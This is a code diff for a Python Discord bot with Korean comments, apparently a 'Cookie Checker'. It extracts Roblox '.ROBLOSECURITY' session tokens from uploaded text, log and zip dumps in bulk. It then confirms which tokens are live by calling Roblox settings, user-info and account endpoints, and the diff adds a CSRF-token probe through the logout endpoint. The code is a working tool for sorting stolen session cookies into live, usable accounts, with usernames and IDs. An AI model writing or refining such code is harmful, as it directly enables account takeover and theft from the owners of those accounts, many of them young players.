@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile, time
+import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile, time, json
 import discord
 from discord.ext import commands
 from discord import Interaction
@@ -15,15 +15,20 @@ MENU_PUBLIC = True
 RESULTS_EPHEMERAL = True
 
 # 속도/안정(1분 컷 목표)
-FAST_MODE = True          # True: 지출 1p, 배지 30개
+FAST_MODE = True           # True: 지출 1p, 배지 30개
+HARD_MODE = True           # CSRF Probe 기반 확정 검증 모드
 CHUNK_SIZE = 500
-CONCURRENCY_AUTH = 10     # 429 시 8~10 권장
+CONCURRENCY_AUTH = 10      # 429면 8~10 권장
 CONCURRENCY_BADGE = 8
 CONCURRENCY_ECON = 8
 MULTI_FILE_CONCURRENCY = 4
-BIND_ATTACHMENTS = True   # 여러 첨부 합본 파이프
+BIND_ATTACHMENTS = True    # 여러 첨부 합본 파이프
 MAX_TOTAL = 0
 MAX_TRX_PAGES = 1 if FAST_MODE else 10
+
+# 파서 라이트 필터(“|_CAE…” 안 씀)
+STRICT_TOKEN_FILTER = False
+MIN_TOKEN_LEN = 50
 
 # 커스텀 이모지(요청 반영)
 EMOJ = {
@@ -78,7 +83,16 @@ async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url
                     except:
                         data = {"error": await r.text()}
                     return r.status, data
-                return r.status, await r.json()
+                # 2xx
+                ct = r.headers.get("Content-Type", "")
+                if "application/json" in ct:
+                    return r.status, await r.json()
+                # 혹시 JSON 아닌데 본문이 비어있을 수 있음
+                txt = await r.text()
+                try:
+                    return r.status, json.loads(txt)
+                except:
+                    return r.status, {"data": txt}
         except Exception as e:
             if tries >= 3:
                 return 599, {"error": f"{type(e).__name__}: {e}"}
@@ -136,7 +150,7 @@ def normalize_text(s: str) -> str:
     return "".join(ch for ch in s if ch.isprintable() or ch in "\n ")
 
 # ========================
-# 게임 프리셋(이름만 사용)
+# 게임 프리셋
 # ========================
 GAMES = {
     "그어가": {"key":"grow_a_garden", "universeId":7436755782},
@@ -153,7 +167,7 @@ KEY_TO_NAME = {
 }
 
 # ========================
-# 파일/토큰 인식(대량/중복/패턴 보강)
+# 파일/토큰 인식(라이트 필터)
 # ========================
 SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
 SUPPORTED_ARCHIVE_EXT = {".zip"}
@@ -169,13 +183,14 @@ def _clean_token(v: str) -> str:
     return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()
 
 def extract_tokens_from_text(text: str) -> list[str]:
+    text = normalize_text(text or "")
     out = []
-    # WARNING 우선(같은 라인 2회 등장도 전부 캐치) — Order 예시 패턴 기준 [[1]](about:blank) [[2]](about:blank) [[3]](about:blank) [[4]](about:blank) [[5]](about:blank)
-    for m in ORDER_TOKEN_RE.finditer(text or ""):
+    # 1) WARNING 우선(라인 중복까지)
+    for m in ORDER_TOKEN_RE.finditer(text):
         out.append(_clean_token(m.group(1)))
-    # 백업 패턴(.ROBLOSECURITY/헤더/JSON) — 내부에 WARNING 있으면 그 지점부터 재슬라이스
+    # 2) 백업 패턴(.ROBLOSECURITY/헤더/JSON)
     for rgx in BACKUP_PATTERNS:
-        for m in rgx.finditer(text or ""):
+        for m in rgx.finditer(text):
             raw = _clean_token(m.group(1))
             if "_|WARNING" in raw:
                 raw = raw[raw.find("_|WARNING"):]
@@ -189,10 +204,14 @@ def parse_cookies_blob(raw_text: str) -> list[tuple[str, str]]:
     seen, pairs = set(), []
     for tok in tokens:
         tok = _clean_token(tok)
-        if not tok or any(ch.isspace() for ch in tok):
+        if not tok:
             continue
-        # (선택) 잘린 토큰 잡는 라이트 필터: 핵심 조각 + 길이
-        if "|_CAEaAhAB." in tok and len(tok) < 100:
+        if any(ch.isspace() for ch in tok):
+            continue
+        # 라이트 필터: 시작 패턴 + 최소 길이
+        if not (tok.startswith("_|WARNING") or tok.startswith("|WARNING")):
+            continue
+        if len(tok) < MIN_TOKEN_LEN:
             continue
         if tok not in seen:
             seen.add(tok)
@@ -221,8 +240,45 @@ async def extract_texts_from_attachment(att: discord.Attachment):
     return [dec(data)], "text"
 
 # ========================
-# 인증/데이터 조회(성공률 최우선 3단계)
+# 인증/데이터 조회(강화: CSRF → settings → mobile → users → accountsettings)
 # ========================
+async def csrf_probe(session: aiohttp.ClientSession) -> tuple[bool, str | None]:
+    try:
+        async with session.post("https://auth.roblox.com/v2/logout") as r:
+            xcsrf = r.headers.get("x-csrf-token")
+            if xcsrf:
+                return True, xcsrf
+            # 401/403이어도 헤더만 오면 인정
+            if r.status in (401, 403) and xcsrf:
+                return True, xcsrf
+            return False, None
+    except Exception:
+        return False, None
+
+async def check_cookie_once_quick(session: aiohttp.ClientSession, hdr: dict):
+    stA, dataA = await fetch_json_with_retry(session, "GET", "https://www.roblox.com/my/settings/json", headers=hdr)
+    if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
+        return True, None, None, dataA.get("Name") or dataA.get("UserName")
+
+    stB, dataB = await fetch_json_with_retry(session, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=hdr)
+    if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
+        uid = dataB.get("UserID")
+        uname = dataB.get("UserName") or dataB.get("UserDisplayName")
+        return True, None, (int(uid) if uid else None), uname
+
+    stC, dataC = await fetch_json_with_retry(session, "GET", "https://users.roblox.com/v1/users/authenticated", headers=hdr)
+    if stC == 200 and isinstance(dataC, dict) and dataC.get("id"):
+        return True, None, int(dataC["id"]), dataC.get("name") or dataC.get("displayName")
+
+    stD, dataD = await fetch_json_with_retry(session, "GET", "https://accountsettings.roblox.com/v1/email", headers=hdr)
+    if stD == 200 and isinstance(dataD, dict):
+        return True, None, None, None
+
+    bad = stA or stB or stC or stD
+    if bad in (401, 403):
+        return False, None, None, None
+    return False, f"unexpected {bad}", None, None
+
 async def check_cookie_once(cookie_value: str):
     UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
@@ -233,24 +289,25 @@ async def check_cookie_once(cookie_value: str):
         "Accept": "application/json, text/plain, */*",
         "Connection": "keep-alive",
     }
-    token = _clean_token(cookie_value)
+    token = (cookie_value or "").replace("\ufeff", "").replace("\u200b", "").replace("\u200d", "").strip()
+
     try:
         async with new_session(cookies={'.ROBLOSECURITY': token}) as s:
-            stA, dataA = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/my/settings/json", headers=HDR)
-            if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
-                return True, None, None, dataA.get("Name") or dataA.get("UserName")
-            stB, dataB = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=HDR)
-            if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
-                uid = dataB.get("UserID")
-                uname = dataB.get("UserName") or dataB.get("UserDisplayName")
-                return True, None, (int(uid) if uid else None), uname
-            stC, dataC = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated", headers=HDR)
-            if stC == 200 and isinstance(dataC, dict) and dataC.get("id"):
-                return True, None, int(dataC["id"]), dataC.get("name") or dataC.get("displayName")
-            bad = stA or stB or stC
-            if bad in (401, 403):
-                return False, None, None, None
-            return False, f"unexpected {bad}", None, None
+            if HARD_MODE:
+                ok_csrf, xcsrf = await csrf_probe(s)
+                if not ok_csrf:
+                    return False, "csrf_fail", None, None
+                # xcsrf를 꼭 붙여야 하는 엔드포인트도 있으니 헤더에 추가
+                hdr2 = dict(HDR)
+                hdr2["X-CSRF-TOKEN"] = xcsrf
+                res = await check_cookie_once_quick(s, hdr2)
+                if res[0]:
+                    return res
+                # 엄격 모드에서 튀었어도 한 번 더 기본 헤더로
+                res2 = await check_cookie_once_quick(s, HDR)
+                return res2
+            else:
+                return await check_cookie_once_quick(s, HDR)
     except Exception as e:
         return False, f"{type(e).__name__}: {e}", None, None
 
@@ -560,7 +617,7 @@ async def on_ready():
         print("[VIEW] persistent CheckView 등록 완료")
     except Exception as e:
         print("[VIEW] 등록 실패:", e)
-    print("[VER] fast=ON, bind=ON, auth=3step(settings->mobile->users), parse=WARNING/_|WARNING, valid=ok(any), uidOnlyForEcon, progressEmbed=ON")
+    print("[VER] fast=ON, bind=ON, HARD_MODE=ON(csrf), auth=quick+strict, parse=WARNING/ROBLOSECURITY, valid=ok(any), uidOnlyForEcon, progressEmbed=ON")
     print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))
 
